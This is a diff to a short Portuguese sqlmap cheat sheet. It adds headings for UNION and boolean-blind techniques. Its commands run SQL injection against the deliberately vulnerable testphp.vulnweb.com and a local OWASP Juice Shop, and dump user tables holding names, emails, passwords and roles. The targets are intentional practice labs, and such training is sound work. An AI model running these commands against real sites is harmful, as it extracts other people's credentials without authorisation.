@@ -1,6 +1,6 @@
 # SQLMap
 
-Site para testes http://testphp.vulnweb.com
+## Site para testes http://testphp.vulnweb.com
 ```
 sqlmap --help
 ```
@@ -16,13 +16,17 @@ sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbms=mysql -D ac
 ``` 
 sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbms=mysql -D acuart -T users -C name,pass,uname,email --dump
 ``` 
-Database Schema Juice-Shop
+## Database Schema Juice-Shop
+
+UNION query (U)
+
 ```
 sqlmap -u "http://localhost:3000/rest/products/search?q=q" --dbms=sqlite --level=3 --risk=3 --technique=U --threads=4 --schema --no-cast
 ```
 ```
 sqlmap -u "http://localhost:3000/rest/products/search?q=q" --dbms=sqlite -D SQLite_masterdb -T Users -C email,password,role --dump --threads=4 --no-cast
-``` 
+```
+Brevity/Boolean-based blind (B)
 ``` 
 sqlmap -u "http://localhost:3000/rest/products/search?q=q" --dbms=sqlite --level=3 --risk=3 --technique=B --threads=4 --schema
 ```
